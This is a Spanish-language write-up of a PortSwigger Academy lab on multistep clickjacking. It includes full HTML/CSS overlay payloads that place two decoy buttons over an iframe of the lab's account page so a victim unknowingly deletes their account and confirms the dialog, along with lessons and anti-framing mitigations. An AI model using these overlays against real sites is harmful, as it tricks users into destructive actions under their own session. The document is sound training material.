---
title: "Multistep clickjacking"
platform: "PortSwigger"
os: "Web Application"
difficulty: "Medium"
ip: "web-security-academy.net"
slug: "multistep-clickjacking"
author: "Z4k7"
date: "2026-11-13"
year: "2026"
status: "pwned"
tags:
  - "Clickjacking"
  - "CSRF"
  - "Multistep"
  - "Web"
  - "UI_Redressing"
  - "target_website"
  - "decoy_website"
  - "fff"
  - "secondClick"
  - "firstClick"
techniques:
  - "Clickjacking"
  - "multistep overlay"
  - "CSRF token"
  - "confirmation dialog bypass"
tools:
  - "Exploit Server PortSwigger"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de BurpSuite Academy (Web Application, Facil) que cierra la serie de clickjacking: la cuenta está protegida por token CSRF y por un cuadro de diálogo de confirmación antes de eliminarla. Un solo overlay no basta — hace falta dos divs señuelo ('Test me first' / 'Test me next') posicionados sobre dos puntos distintos del mismo iframe, uno para el botón 'Delete account' y otro para el botón de confirmación que aparece después del primer clic.  ---"
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio cuenta con funcionalidades de cuenta protegidas por un token CSRF y un cuadro de diálogo de confirmación para evitar el clickjacking. Para resolverlo, diseñe un ataque que engañe al usuario para que haga clic en el botón de eliminar cuenta y en el cuadro de diálogo de confirmación mediante las acciones señuelo "Haz clic aquí primero" y "Haz clic aquí después". Necesitará dos elementos para este laboratorio.
          Puedes iniciar sesión en la cuenta tú mismo utilizando las siguientes credenciales:`wiener:peter`
      - kind: "callout"
        type: "info"
        label: "Pista"
        text: "La víctima utilizará Chrome, así que prueba tu exploit en ese navegador."

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          ingresamos en el laboratorio podemos validar que contamos con un login ingresamos con los datos suministrados en el objetivo.
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113201056969.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          una vez ya contamos con el acceso en la web validamos el entorno del usuario
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113201152301.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Realizamos reconocimiento del entorno del usuario podemos validar un apartado donde podernos ingresar un correo y realizar la actualización del mismo.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El reconocimiento clave aquí no es técnico sino de flujo de UI: antes de tocar el Exploit Server, haz el proceso de eliminar cuenta manualmente y cuenta cuántos clics y qué cambia en pantalla entre cada uno. Cada paso adicional de confirmación necesita su propio div señuelo, posicionado para el estado de la página *después* de que el clic anterior ya se ejecutó — no para el estado inicial."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          validando el laboratorio menciona que se debe dar click en el botón de  eliminar después de dar ese click es necesario confirmar el proceso como se observa a continuación.
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113201842346.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113201917471.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Podemos validar que si podremos manipular la url para tratar de modificar el correo de la victima en este caso ingresamos al servidor del laboratorio para tratar de manipular la web entregada al usuario.
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113201956279.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ingresamos en el `servidor` y manipulamos el entorno  `Body:`
          Código
      - kind: "code"
        lang: "HTML"
        code: |
          <head>
          	<style>
          		#target_website {
          			position:relative;
          			width:1570px;
          			height:700px;
          			opacity:1;
          			z-index:2;
          			}
          		#decoy_website {
          			position: absolute;
          			top: 527px;
          			left: 218px;
          			width: 110px;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
          	</style>
          </head>
      - kind: "code"
        lang: "HTML"
        code: |
          <head>
          	<style>
          		#target_website {
          			position:relative;
          			width:1570px;
          			height:700px;
          			opacity:1;
          			z-index:2;
          			}
          		#decoy_website {
          			position: absolute;
          			top: 527px;
          			left: 218px;
          			width: 110px;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
          	</style>
          </head>
          <body>
          <div id="decoy_website">CLICK ME</div>
          	<iframe id="target_website" src="https://">
          	</iframe>
          </body>
      - kind: "note"
        text: |
          Guardamos el código en el servidor e ingresamos en View exploit para validar su entorno y comportamiento antes de enviar el exploit a la victima.
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113202233936.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ingresamos en el apartado de vista y podemos validar lo siguiente
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113202351802.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          al momento de dar click en el botón se ve reflejado el cambio para la confirmación de la eliminación.
          ya solo queda manipular el style para sobreponer el bottom ,Enviamos el exploit a la victima  y contamos con un resultado de ok
          código:
      - kind: "code"
        lang: "JS"
        code: |
          <head>
          	<style>
          		#target_website {
          			position:relative;
          			width:1570px;
          			height:700px;
          			opacity:0.1;
          			z-index:2;
          			}
          		#secondClick{
          			position: absolute;
          			top: 527px;
          			left: 218px;
          			width: 110px;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
          #firstClick{
          			position: absolute;
          			top: 327px;
          			left: 374px;
          			width: 110px;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
          	</style>
          </head>
          <body>
          <div id="firstClick">Test me first</div>
          <div id="secondClick">Test me next</div>
          	<iframe id="target_website" src="https://0a22006a0451a03580d3b7af008b003e.web-security-academy.net/my-account/">
          	</iframe>
          </body>
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113204747873.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          se realiza click en el botón next
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113204835101.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113210437283.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Multistep%20clickjacking/file-20261113210408676.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El detalle que hace funcionar este exploit: el iframe apunta a `/my-account/` (la página base), no directamente a un estado post-clic. Es el propio clic de la víctima sobre `#firstClick` el que dispara 'Delete account' dentro del iframe y hace aparecer el diálogo de confirmación; recién ahí el segundo div (`#secondClick`), ya posicionado donde aparecerá ese diálogo, se vuelve clicable con sentido. Si el orden de los clics no coincide exactamente con el orden real de la UI, el ataque falla aunque las coordenadas sean correctas.  Alternativas y variantes: - Multistep con 3+ pasos: el mismo patrón escala a cualquier número de confirmaciones, con un div por paso. - Combinarlo con `?id=` o parámetros GET si el flujo post-login lo permite, para reducir aún más la interacción. - Probar primero con opacidad visible (0.1) para verificar que ambos señuelos caen exactamente sobre sus botones en cada paso, antes de bajarla para el exploit final."

lessons:
  - 'Cuando una acción sensible requiere confirmación adicional (un segundo clic), el overlay de clickjacking necesita un div señuelo por cada paso, no solo uno.'
  - 'Las coordenadas del segundo señuelo corresponden a la posición del diálogo de confirmación, que solo aparece después de que el primer clic ya se ejecutó dentro del iframe.'
  - 'El iframe sigue apuntando a la página base del flujo (`/my-account/`); es la secuencia de clics de la víctima la que avanza el estado de la aplicación dentro del iframe, paso a paso.'
  - 'Ni el token CSRF ni el diálogo de confirmación detienen el ataque, porque ambos clics los ejecuta la propia víctima, con su sesión, dentro de su navegador.'
  - 'Probar el exploit con opacidad visible antes de ocultarla permite verificar la alineación de ambos señuelos en sus respectivos pasos.'
mitigation:
  - 'Los mismos controles anti-framing de los labs anteriores: `X-Frame-Options: deny` o `Content-Security-Policy: frame-ancestors ''none''`.'
  - 'No asumir que un diálogo de confirmación adicional es, por sí solo, una defensa contra clickjacking — un overlay con suficientes pasos lo neutraliza igual.'
  - 'Cookies de sesión con `SameSite=Lax` o `Strict`, que rompen el ataque en navegadores modernos al no enviarse dentro de un iframe de otro origen.'
  - 'Exigir una interacción que un overlay no pueda replicar fácilmente, como un CAPTCHA o una verificación fuera de banda, para acciones destructivas.'
---
